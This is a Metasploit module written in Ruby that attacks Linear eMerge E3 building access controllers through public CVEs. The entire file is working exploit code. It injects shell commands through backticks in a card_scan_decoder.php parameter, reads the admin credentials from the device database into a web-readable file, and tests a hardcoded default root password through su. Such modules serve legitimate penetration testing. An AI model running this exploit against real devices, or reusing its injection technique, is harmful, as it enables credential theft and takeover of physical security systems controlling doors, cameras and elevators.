##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/stopwatch'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  # default root credentials on the Linear eMerge E3 access controller
  ROOT_ID = 'root'.freeze
  ROOT_PWD = 'davestyle'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linear eMerge E3 Access Controller Credentials Disclosure',
        'Description' => %q{
          This module exploits a vulnerability in the Linear eMerge
          E3 Access Controller that allows an unauthenticated attacker to retrieve the admin credentials.
          The admin credentials provide access to the admin dashboard of Linear eMerge E3-Series devices,
          which controls the access to the entire building doors, cameras, elevator, etc... and
          provide access information about employees who can access the building.
          It will allow the attacker to take control of the entire building.
          Next this module will also check if the default root credentials on the system are still set.
          The issue is triggered by an unsanitized exec() PHP function allowing arbitrary command execution.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Gjoko Krstic <gjoko[at]applied-risk.com>', # Discovery, Exploit
          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # MSF Module contributor
        ],
        'References' => [
          [ 'CVE', '2019-7252'],
          [ 'CVE', '2019-7256'],
          [ 'URL', 'https://attackerkb.com/topics/v1NMUqh8F2/cve-2019-7252'],
          [ 'URL', 'https://applied-risk.com/resources/ar-2019-005' ],
          [ 'URL', 'https://www.nortekcontrol.com' ],
          [ 'PACKETSTORM', '155256']
        ],
        'DisclosureDate' => '2019-10-29',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [true, 'Linear eMerge E3 path', '/']),
        OptBool.new('STORE_CRED', [false, 'Store credentials into the database.', true])
      ]
    )
  end

  def report_creds(user, pwd)
    credential_data = {
      module_fullname: fullname,
      username: user,
      private_data: pwd,
      private_type: :password,
      workspace_id: myworkspace_id,
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_details)

    cred_res = create_credential_and_login(credential_data)
    unless cred_res.nil?
      print_status("Credentials #{user}:#{pwd} are added to the database...")
    end
  end

  def execute_command(cmd, _opts = {})
    random_no = rand(30..100)
    return send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'card_scan_decoder.php'),
      'vars_get' =>
        {
          'No' => random_no,
          'door' => "`#{cmd}`"
        }
    })
  rescue StandardError => e
    elog("#{peer} - Communication error occurred: #{e.message}", error: e)
    fail_with(Failure::Unknown, "Communication error occurred: #{e.message}")
  end

  # Checking if the target is vulnerable by executing a randomized sleep to test the remote code execution
  def check
    print_status("Checking if #{peer} can be exploited.")
    sleep_time = rand(2..6)
    print_status("Performing command injection test issuing a sleep command of #{sleep_time} seconds.")
    res, elapsed_time = Rex::Stopwatch.elapsed_time do
      execute_command("sleep #{sleep_time}")
    end

    return Exploit::CheckCode::Unknown('No response received from the target!') unless res

    print_status("Elapsed time: #{elapsed_time} seconds.")
    return Exploit::CheckCode::Safe('Failed to test command injection.') unless elapsed_time >= sleep_time

    Exploit::CheckCode::Vulnerable('Successfully tested command injection.')
  end

  def run
    # get the admin web credentials...
    @random_filename = "#{Rex::Text.rand_text_alpha(8..16)}.txt"
    print_status('Retrieving admin web credentials...')
    cmd = 'grep "Controller" /tmp/SpiderDB/Spider.db|cut -f 5,6 -d ","|grep ID > ' + @random_filename.to_s
    execute_command(cmd)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, @random_filename)
    })
    if res.body.empty?
      print_status('Could not retrieve the admin web credentials. You might want to try the default admin:admin.')
    else
      creds = res.body.scan(/'([^']*)'/).uniq
      creds[1..].each do |pwd|
        print_good("Admin web credentials found: #{creds[0].join}:#{pwd.join}")
        if datastore['STORE_CRED'] == true
          report_creds(creds[0].join, pwd.join)
        end
      end
    end
    # cleaning up...
    cmd = "rm #{@random_filename}"
    execute_command(cmd)

    # checking the default root credentials...
    @random_filename = "#{Rex::Text.rand_text_alpha(8..16)}.txt"
    print_status('Checking for default root system credentials...')
    cmd = 'echo ' + ROOT_PWD.to_s + '|su -c "whoami > /spider/web/webroot/' + "#{@random_filename}\""
    execute_command(cmd)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, @random_filename)
    })
    if res.body.chomp == ROOT_ID
      print_good("Default root system credentials found: #{ROOT_ID}:#{ROOT_PWD}")
      if datastore['STORE_CRED'] == true
        report_creds(ROOT_ID, ROOT_PWD)
      end
    else
      print_status('No default root system credentials found.')
    end
    # cleaning up...
    cmd = "rm #{@random_filename}"
    execute_command(cmd)
  end
end
